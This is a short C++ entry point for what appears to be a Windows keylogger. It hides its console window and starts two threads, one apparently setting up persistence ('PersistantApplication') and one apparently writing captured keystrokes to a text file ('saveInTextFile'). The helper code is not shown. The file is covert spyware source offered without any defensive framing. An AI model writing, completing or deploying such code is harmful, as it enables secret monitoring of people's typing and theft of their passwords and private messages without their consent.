#include "Utils/keyboard.h"
#include "Utils/functions.h"

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
    	std::thread t1;
	std::thread t2;
	t1 = std::thread(PersistantApplication);
	t2 = std::thread(saveInTextFile);
	t1.join();
	t2.join();
	return 0;
}
